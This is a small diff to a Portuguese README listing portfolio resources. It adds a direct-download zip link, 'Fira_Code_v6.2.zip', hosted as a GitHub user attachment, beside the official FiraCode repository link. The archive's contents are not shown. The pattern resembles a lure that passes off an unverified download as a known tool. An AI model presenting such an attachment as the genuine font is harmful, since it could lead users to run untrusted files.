@@ -428,6 +428,7 @@ Exemplos de portfólio profissional:
 #### ✍️ Fonts:
 
 - [FiraCode](https://github.com/tonsky/FiraCode)
+- [Fira_Code_v6.2.zip](https://github.com/user-attachments/files/21781725/Fira_Code_v6.2.zip)
 
 -----
 
